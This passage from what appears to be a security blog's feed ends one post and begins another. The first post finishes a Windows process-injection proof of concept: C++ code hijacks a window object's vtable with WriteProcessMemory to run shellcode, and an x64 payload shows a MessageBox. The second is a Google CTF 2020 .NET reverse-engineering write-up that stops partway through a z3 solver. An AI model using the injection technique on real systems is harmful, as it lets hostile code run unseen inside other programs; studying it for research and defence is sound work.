&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;));
    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xb8&lt;/span&gt;));

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;; i++)
        shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(vMem &amp;gt;&amp;gt; i*&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;));

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// call rax
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;));
    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xd0&lt;/span&gt;));

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// mov rax, old_release
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0x48&lt;/span&gt;));
    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xb8&lt;/span&gt;));

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;; i++)
        shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(m_vTable.pfnRelease &amp;gt;&amp;gt; i*&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;));

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// jmp rax
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;));
    shellcode.push_back(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint8_t&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0xe0&lt;/span&gt;));

    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Press Enter To Exploit!&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; sc;
    sc = getchar();

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;auto&lt;/span&gt; shellcodeAddr = vMem + payloadSize + &lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt; &amp;amp; -&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;;
    m_vTable.pfnRelease = shellcodeAddr;
    printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Shellcode Addr: %#016lx&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, shellcodeAddr);
    WriteProcessMemory(hProcess, PVOID(shellcodeAddr), shellcode.data(), shellcode.size(), &amp;amp;nRead);
    WriteProcessMemory(hProcess, PVOID(vTableMem), &amp;amp;m_vTable, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; m_vTable, &amp;amp;nRead);
    WriteProcessMemory(hProcess, PVOID(m_windowPtr), &amp;amp;vTableMem, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt; vTableMem, &amp;amp;nRead);

    CloseHandle(hProcess);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The Payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.code

main:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    mov rax, [count]
    inc qword ptr [count]
    cmp rax, 3
    jge bye
    xor ecx, ecx
    call next
    db &amp;quot;Hello World!&amp;quot;, 0

next:
    pop rdx
    call fuck
    db &amp;quot;x0r19x91&amp;quot;, 0

fuck:
    pop r8
    mov r9d, 040h
    mov rax, [fnMessageBoxA]
    call rax

bye:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

   count dq 0
   fnMessageBoxA dq 00007FF9D30B2CE0h   ; hardcoded, just for poc, will resolve dynamically later

end
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;output&#34;&gt;Output&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inject-tasklist/exp.png&#34; alt=&#34;exp&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;inspiration&#34;&gt;Inspiration&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://modexp.wordpress.com/2019/08/10/windows-process-injection-tooltip-controls/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;modexp&amp;rsquo;s awesome blog&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        <item>
        <title>Google CTF 2020 - .NET</title>
        <link>http://localhost:1313/post/google-ctf-2020-.net/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/google-ctf-2020-.net/</guid>
        <description>&lt;p&gt;I will be describing in detail what I did and what I should have done.&lt;/p&gt;
&lt;h1 id=&#34;what-i-did&#34;&gt;What I Did&lt;/h1&gt;
&lt;h2 id=&#34;saturday-evening&#34;&gt;Saturday Evening&lt;/h2&gt;
&lt;p&gt;On Saturday evening, I started with this challenge. It&amp;rsquo;s a plain .NET executable, so I opened with dnSpy and started debugging.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i0.png&#34; alt=&#34;i0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;So, this is definitely a binary written in C++/CLI.&lt;br&gt;
&lt;img src=&#34;http://localhost:1313/images/2020/google/i1.png&#34; alt=&#34;i1&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Reading the docs for Harmony, it&amp;rsquo;s clear that the above code introduces a new prefix to the methods.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NUFFRA -&amp;gt; FYRKANTIG, GRONKULLA -&amp;gt; RIKTIG_OGLA, SPARSAM -&amp;gt; GRUNDTAL_NORRVIKEN, FLARDFULL -&amp;gt; DAGSTORP&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;where &lt;code&gt;a -&amp;gt; b&lt;/code&gt; means a is executed when b is called, and then b is executed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i2.png&#34; alt=&#34;i2&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Now i tried to step into &lt;code&gt;&amp;lt;Module&amp;gt;.NativeGRUNDTAL_NORRVIKEN&lt;/code&gt; using dnSpy, but I couldn&amp;rsquo;t. Because it was pointing to unmanaged code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i3.png&#34; alt=&#34;i3&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I didn&amp;rsquo;t see the RVA that dnSpy showed for this function. Following this RVA would landed me to the native code. What I did was, I opened the method body in hex editor and tried to locate the offset &lt;code&gt;0x2e90&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i4.png&#34; alt=&#34;i4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The offset &lt;code&gt;0x2e90&lt;/code&gt; points to the following function&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i5.png&#34; alt=&#34;i5&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Now the fun begins here. Following the function at &lt;code&gt;0x0404961&lt;/code&gt;, it jumps to the address &lt;code&gt;0x600004F&lt;/code&gt;. Now I got stuck, since I couldn&amp;rsquo;t resolve the address, I tried to make a logical guess what the function could be.&lt;/p&gt;
&lt;p&gt;The loop that iterates n times, where n is the return value of &lt;code&gt;0x0404961&lt;/code&gt;. So, the possibility that the function can be &lt;code&gt;strlen&lt;/code&gt;, since we know from dnSpy that the function at &lt;code&gt;0x403a90&lt;/code&gt; takes a &lt;code&gt;std::string*&lt;/code&gt;. Checking out the xrefs of &lt;code&gt;0x0404961&lt;/code&gt; we get another one in &lt;code&gt;0x4039D0&lt;/code&gt;, which calls the target function &lt;code&gt;0x0404961&lt;/code&gt; in the same way. So, &lt;code&gt;0x0404961&lt;/code&gt; being &lt;code&gt;strlen&lt;/code&gt; has a fair possibility.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402370 ToCustomBase64  proc near               ; CODE XREF: ToCustomBase64_+22↓p
.text:00402370
.text:00402370 arg_0           = byte ptr  8
.text:00402370
.text:00402370                 push    ebp
.text:00402371                 mov     ebp, esp
.text:00402373                 mov     dl, [ebp+arg_0]
.text:00402376                 lea     ecx, [edx-30h]
.text:00402379                 cmp     cl, 9
.text:0040237C                 ja      short loc_402383
.text:0040237E                 lea     eax, [edx-30h]
.text:00402381                 pop     ebp
.text:00402382                 retn
; ... snip ...
.text:0040239B loc_40239B:                             ; CODE XREF: ToCustomBase64+24↑j
.text:0040239B                 cmp     dl, 7Bh ; &#39;{&#39;
.text:0040239E                 jnz     short loc_4023A4
.text:004023A0                 mov     al, 3Eh ; &#39;&amp;gt;&#39;
.text:004023A2                 pop     ebp
.text:004023A3                 retn
.text:004023A4 ; ---------------------------------------------------------------------------
.text:004023A4
.text:004023A4 loc_4023A4:                             ; CODE XREF: ToCustomBase64+2E↑j
.text:004023A4                 or      eax, 0FFFFFFFFh
.text:004023A7                 mov     ecx, 3Fh ; &#39;?&#39;
.text:004023AC                 cmp     dl, 7Dh ; &#39;}&#39;
.text:004023AF                 cmovz   eax, ecx
.text:004023B2                 pop     ebp
.text:004023B3                 retn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s analyze this block, then the function is clear.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402373                 mov     dl, [ebp+arg_0]
.text:00402376                 lea     ecx, [edx-30h]
.text:00402379                 cmp     cl, 9
.text:0040237C                 ja      short loc_402383
.text:0040237E                 lea     eax, [edx-30h]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, this function takes a char, whose address is returned by &lt;code&gt;0x00404E02&lt;/code&gt;, so a strong possibility of &lt;code&gt;0x00404E02&lt;/code&gt; is &lt;code&gt;char&amp;amp; std::string::operator[]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In this piece of code, we have &lt;code&gt;ecx ule 9&lt;/code&gt; for &lt;code&gt;0x40237e&lt;/code&gt; to be executed. Where &lt;code&gt;ule&lt;/code&gt; is &lt;code&gt;unsigned less or equal&lt;/code&gt;. So, if $$ecx \lt 0$$ then ecx has bit 31 set, implying $$ecx = 2^{31} + a$$, so obviously &lt;code&gt;ecx &amp;gt; 9&lt;/code&gt;. Therefore the only possibility is $$0 \le ecx \le 9$$&lt;/p&gt;
&lt;p&gt;So, this block accepts digits and maps them to their integer equivalents.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ToCustomBase64&lt;/code&gt; maps the input string &lt;code&gt;&#39;[0-9A-Za-z\{\}]+&#39;&lt;/code&gt; to &lt;code&gt;[0-63]&lt;/code&gt;. Digits are mapped to &lt;code&gt;[0-9]&lt;/code&gt;, uppercase letters are mapped to &lt;code&gt;[10-35]&lt;/code&gt;, lowercase letters to &lt;code&gt;[36-61]&lt;/code&gt;, &lt;code&gt;{&lt;/code&gt; to &lt;code&gt;62&lt;/code&gt; and &lt;code&gt;}&lt;/code&gt; to &lt;code&gt;63&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Next the transformed input is passed to &lt;code&gt;FYRKANTIGImpl&lt;/code&gt;. Similarly, I traced the offset to &lt;code&gt;0x004044B0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i7.png&#34; alt=&#34;i7&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We have &lt;code&gt;lea     ecx, [ebp+src]&lt;/code&gt; before the call implying that the function &lt;code&gt;sub_404F0C&lt;/code&gt; is a method of &lt;code&gt;[ebp+src]&lt;/code&gt;. Something like this &lt;code&gt;[ebp+src].sub_404F0C(byte_4081D0)&lt;/code&gt;. So, it can be assumed that &lt;code&gt;sub_404F0C&lt;/code&gt; is a &lt;code&gt;std::string::string(char*)&lt;/code&gt; constructor. It then xor&amp;rsquo;s &lt;code&gt;[ebp+dst]&lt;/code&gt; with &lt;code&gt;[ebp+src]&lt;/code&gt;. Now I got stuck at &lt;code&gt;sub_403F10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i8.png&#34; alt=&#34;i8&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;sunday-evening&#34;&gt;Sunday Evening&lt;/h2&gt;
&lt;p&gt;I started debugging with IDA, it crashed. I moved onto x32dbg, but it crashed too&amp;hellip; &lt;em&gt;hope lost&amp;hellip;&lt;/em&gt;  Now I had to use &lt;a class=&#34;link&#34; href=&#34;https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md#breakpointshttps://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md#breakpoints&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;WinDBG&lt;/a&gt;, my last option.&lt;/p&gt;
&lt;p&gt;I started debugging with windbg. First I cleared the &lt;code&gt;PEB.IsDebuggerPresent&lt;/code&gt; flag and then put a breakpoint on &lt;code&gt;0x00403F65&lt;/code&gt;. I traced the call to the following code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;        pszEnd      =   08h
        pszStart    =   0Ch
061e8218  push    ebp
061e8219  mov     ebp, esp
061e821b  push    edi
061e821c  push    esi
061e821d  push    ebx
061e821e  sub     esp, 20h
061e8221  mov     ebx, dword ptr fs:[0E20h]
061e8228  mov     dword ptr [ebp-28h], offset clr!InlinedCallFrame::vftable
061e822f  mov     dword ptr [ebp-2Ch], 0FFF5AFAEh
061e8236  mov     eax, dword ptr [ebx+0Ch]
061e8239  mov     dword ptr [ebp-24h], eax
061e823c  mov     dword ptr [ebp-14h], ebp
061e823f  mov     dword ptr [ebp-18h], 0
061e8246  lea     eax, [ebp-28h]
061e8249  mov     dword ptr [ebx+0Ch], eax
061e824c  mov     dword ptr [ebp-10h], ecx
061e824f  mov     eax, dword ptr [ebp+pszStart]
061e8252  cmp     eax, dword ptr [ebp+pszEnd]
061e8255  je      061e82c0

061e8257  mov     esi, dword ptr [ebp+pszStart]
061e825a  inc     esi
061e825b  cmp     esi, dword ptr [ebp+pszEnd]
061e825e  je      061e82c0

061e8260  mov     edi, esi
061e8262  sub     edi, dword ptr [ebp+pszStart]

061e8265  lea     eax, [edi+1]
061e8268  push    eax
061e8269  mov     ecx, dword ptr [ebp-10h]
061e826c  mov     dword ptr [ebp-20h], 1227420h
061e8273  mov     dword ptr [ebp-1Ch], esp
061e8276  mov     dword ptr [ebp-18h], 61E8287h
061e827d  mov     byte ptr [ebx+8], 0
061e8281  call    dword ptr ds:[122767Ch]           ; ucrtbase!rand
061e8287  mov     byte ptr [ebx+8], 1
061e828b  cmp     dword ptr [clr!g_TrapReturningThreads (755c2048)], 0
061e8292  je      061e829b
061e8294  push    eax
061e8295  call    clr!JIT_RareDisableHelper (74f3c2b0)
061e829a  pop     eax
061e829b  mov     dword ptr [ebp-18h], 0
061e82a2  mov     edx, eax
061e82a4  cmp     edx, edi
061e82a6  je      061e82b9

061e82a8  mov     eax, dword ptr [ebp+pszStart]
061e82ab  add     eax, edx
061e82ad  mov     edx, eax
061e82af  movsx   ecx, byte ptr [esi]
061e82b2  movsx   eax, byte ptr [edx]
061e82b5  mov     byte ptr [esi], al
061e82b7  mov     byte ptr [edx], cl

061e82b9  inc     esi
061e82ba  inc     edi
061e82bb  cmp     esi, dword ptr [ebp+pszEnd]
061e82be  jne     061e8265

061e82c0  mov     edi, dword ptr [ebp-24h]
061e82c3  mov     dword ptr [ebx+0Ch], edi
061e82c6  lea     esp, [ebp-0Ch]
061e82c9  pop     ebx
061e82ca  pop     esi
061e82cb  pop     edi
061e82cc  pop     ebp
061e82cd  ret     8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The call at &lt;code&gt;0x061e8281&lt;/code&gt; lands right here:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i9.png&#34; alt=&#34;i9&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It points to rva 0x6bdc which is &lt;code&gt;rand&lt;/code&gt;. So, what we have here is something like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;srand(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x23c);
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// pEnd is actually pStart+len-2
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;; j &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;28&lt;/span&gt;; j++)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; pos = rand() % (j+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (pos != j)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; tmp = ans[pos];
        ans[pos] = ans[j];
        ans[j] = tmp;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i10.png&#34; alt=&#34;i10&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The functions &lt;code&gt;0x403b9c&lt;/code&gt;, &lt;code&gt;0x404df6&lt;/code&gt; and &lt;code&gt;0x404e89&lt;/code&gt; are useless since they don&amp;rsquo;t reference &lt;code&gt;esi&lt;/code&gt; which is the transformed input param.&lt;/p&gt;
&lt;p&gt;The next function of interest is &lt;code&gt;0x404eee&lt;/code&gt;. Tracing it with windbg leads to &lt;code&gt;0x403AE0&lt;/code&gt;. Now all functions are resolved but &lt;code&gt;0x0404C3E&lt;/code&gt;. Tracing it, we land into &lt;code&gt;std::swap&lt;/code&gt;. So, &lt;code&gt;0x403ae0&lt;/code&gt; can be represented as&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt; Shuffle2(List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt; inp)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; ans = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;uint&lt;/span&gt;&amp;gt;(inp);
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; inp.Count-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;; i += &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x1c &amp;amp;&amp;amp; i != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;x1b)
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; t = ans[i];
            ans[i] = ans[i+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;];
            ans[i+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = t;
        }
    }
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i11.png&#34; alt=&#34;i11&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Now &lt;code&gt;GRUNDTAL_NORRVIKEN&lt;/code&gt; is called with the result of &lt;code&gt;Shuffle2&lt;/code&gt;. We know that it has a prefix call to &lt;code&gt;SPARSAM&lt;/code&gt;. So, &lt;code&gt;SPARSAM&lt;/code&gt; will be called and then the control returns to &lt;code&gt;GRUNDTAL_NORRVIKEN&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/2020/google/i12.png&#34; alt=&#34;i12&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Note that it&amp;rsquo;s setting a ref param &lt;code&gt;__result&lt;/code&gt;. According to Harmony&amp;rsquo;s docs, &lt;strong&gt;if a prefix assigns a value to &lt;code&gt;__result&lt;/code&gt;, then the original function is skipped&lt;/strong&gt;. So, &lt;code&gt;SPARSAM&lt;/code&gt; replaces &lt;code&gt;GRUNDTAL_NORRVIKEN&lt;/code&gt;. &lt;code&gt;DAGSTORP&lt;/code&gt; is a plain xor, &lt;code&gt;FLARDFULL&lt;/code&gt; does nothing. &lt;code&gt;SMORBOLL&lt;/code&gt; computes a checksum and checks if the byte at index 28 matches the checksum. &lt;code&gt;HEROISK&lt;/code&gt; calls &lt;code&gt;VAXMYRA&lt;/code&gt; which ensures that all the bytes returned by &lt;code&gt;DAGSTORP&lt;/code&gt; are unique and then validates a sequence of constraints.&lt;/p&gt;
&lt;h2 id=&#34;solver&#34;&gt;Solver&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;z3&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; *

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;checksum&lt;/span&gt;(l):
    n = &lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;
    i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;30&lt;/span&gt;:
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; i != &lt;span style=&#34;color:#3677a9&#34;&gt;28&lt;/span&gt;:
            n += l[i]
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i % &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt; == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;):
                n += l[i]
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i % &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt; == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;):
                n += -&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;*l[i]
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i % &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt; == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;):
                n += -&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;*l[i]
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (i % &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt; == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;):
                n += &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;*l[i]
        i += &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; n &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;63&lt;/span&gt;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;doCmp&lt;/span&gt;(a, b, c):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ULE(a-b, c)

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;xse&lt;/span&gt;(n):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; SignExt(&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;, Extract(&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, n))

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;se&lt;/span&gt;(n):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; n

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;ze&lt;/span&gt;(n):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; n

fuckingBase = string.digits + string.ascii_uppercase + string.ascii_lowercase + &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;{}&amp;#34;&lt;/span&gt;
invFuck = {}
